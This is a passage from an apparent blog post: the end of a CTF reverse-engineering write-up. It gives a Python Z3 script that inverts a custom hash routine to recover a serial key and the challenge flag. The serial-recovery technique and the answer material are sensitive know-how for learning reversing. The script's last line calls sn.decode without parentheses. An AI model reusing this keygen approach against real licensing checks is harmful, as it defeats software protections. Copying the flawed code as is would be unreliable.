s8)</span><br><span class="line">    branch_state1 = If(c_topbit_same, branch_topbit0, s8)</span><br><span class="line">    <span class="keyword">return</span> If(c_state_lsb0, branch_state0, branch_state1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">round_func</span>(<span class="params">inp8, state32</span>):</span><br><span class="line">    inp32 = zext8_to_32(inp8)</span><br><span class="line">    round_num = URem(inp32, BV32(<span class="number">5</span>)) + BV32(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">one_iter</span>(<span class="params">st, i</span>):</span><br><span class="line">        tmp = st &amp; BV32(<span class="number">0x80000000</span>)</span><br><span class="line">        st2 = (st &lt;&lt; <span class="number">1</span>) &amp; BV32(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">        st2 = If(tmp != BV32(<span class="number">0</span>), st2 ^ BV32(<span class="number">0x04C11DB7</span>), st2)</span><br><span class="line">        <span class="keyword">if</span> (i &amp; <span class="number">1</span>) == <span class="number">0</span>: st2 = st2 ^ inp32</span><br><span class="line">        <span class="keyword">else</span>: st2 = (st2 + BV32(i * <span class="number">10</span>)) &amp; BV32(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">        <span class="keyword">return</span> st2</span><br><span class="line">    st = state32</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        st_i = one_iter(st, i)</span><br><span class="line">        st = If(ULT32(BV32(i), round_num), st_i, st)</span><br><span class="line">    <span class="keyword">return</span> st</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tail_func</span>(<span class="params">inp8, state32</span>):</span><br><span class="line">    tmp  = LShR(state32, <span class="number">16</span>) ^ state32</span><br><span class="line">    tmp1 = LShR(tmp, <span class="number">8</span>) ^ tmp</span><br><span class="line">    cond = UGT32(tmp1 &amp; BV32(<span class="number">0xF</span>), BV32(<span class="number">7</span>))</span><br><span class="line">    <span class="keyword">return</span> If(cond, (~state32) &amp; BV32(<span class="number">0xFFFFFFFF</span>), state32)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">byte_func</span>(<span class="params">inp8, state32</span>):</span><br><span class="line">    st = switch_case(inp8, state32)</span><br><span class="line">    st = round_func(inp8, st)</span><br><span class="line">    st = tail_func(inp8, st)</span><br><span class="line">    <span class="keyword">return</span> st</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    enc = [<span class="number">0x865DBB47</span>, <span class="number">0x0A6EB190</span>, <span class="number">0x20476C33</span>, <span class="number">0x1C8A7693</span>, <span class="number">0x59FEBDFB</span>]</span><br><span class="line">    sn = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        b0, b1, b2, b3 = BitVecs(<span class="string">&quot;b0 b1 b2 b3&quot;</span>, <span class="number">8</span>)</span><br><span class="line">        bs = [b0, b1, b2, b3]</span><br><span class="line">        s = Solver()</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> bs: s.add(And(b &gt;= <span class="number">0x20</span>, b &lt;= <span class="number">0x7e</span>))</span><br><span class="line">        state = BV32(<span class="number">0xCAFEBABE</span>+i*<span class="number">4</span>*<span class="number">0x112233</span>)</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> bs: state = byte_func(b, state)</span><br><span class="line">        target = BV32(enc[i])</span><br><span class="line">        s.add(state == target)</span><br><span class="line">        <span class="keyword">if</span> s.check() == sat:</span><br><span class="line">            m = s.model()</span><br><span class="line">            sol = [m.<span class="built_in">eval</span>(b).as_long() <span class="keyword">for</span> b <span class="keyword">in</span> bs]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;i&#125;</span>] bytes = <span class="subst">&#123;sol&#125;</span>  hex = <span class="subst">&#123;<span class="built_in">bytes</span>(sol).<span class="built_in">hex</span>()&#125;</span>  ascii = <span class="subst">&#123;<span class="built_in">bytes</span>(sol)&#125;</span>&quot;</span>)</span><br><span class="line">            sn += <span class="built_in">bytearray</span>(sol)</span><br><span class="line">    b0, b1, b2 = BitVecs(<span class="string">&quot;b0 b1 b2&quot;</span>, <span class="number">8</span>)</span><br><span class="line">    bs = [b0, b1, b2]</span><br><span class="line">    s = Solver()</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> bs: s.add(And(b &gt;= <span class="number">0x20</span>, b &lt;= <span class="number">0x7e</span>))</span><br><span class="line">    state = BV32(<span class="number">0xCAFEBABE</span>+<span class="number">16</span>*<span class="number">0x112233</span>)</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> bs: state = byte_func(b, state)</span><br><span class="line">    target = BV32(enc[<span class="number">4</span>])</span><br><span class="line">    s.add(state == target)</span><br><span class="line">    <span class="keyword">if</span> s.check() == sat:</span><br><span class="line">        m = s.model()</span><br><span class="line">        sol = [m.<span class="built_in">eval</span>(b).as_long() <span class="keyword">for</span> b <span class="keyword">in</span> bs]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[4] bytes = <span class="subst">&#123;sol&#125;</span>  hex = <span class="subst">&#123;<span class="built_in">bytes</span>(sol).<span class="built_in">hex</span>()&#125;</span>  ascii = <span class="subst">&#123;<span class="built_in">bytes</span>(sol)&#125;</span>&quot;</span>)</span><br><span class="line">        sn += <span class="built_in">bytearray</span>(sol)</span><br><span class="line">    <span class="built_in">print</span>(sn.decode)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>The input is <code>D3FE-A7ED-BAAD-C0D3</code>.</p>
<p><font color=deepskyblue><strong>CMO{byp4ss3d_f4tm1k3_2o26}</strong></font></p>

        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left  disabled "
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2026/01/08/visualize_indirect_jump/"
      title="关于间接跳转的一种分析方法"
     >

    <p class="title-text">
      
        关于间接跳转的一种分析方法
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>

 
    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2026 Astral Prisma<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
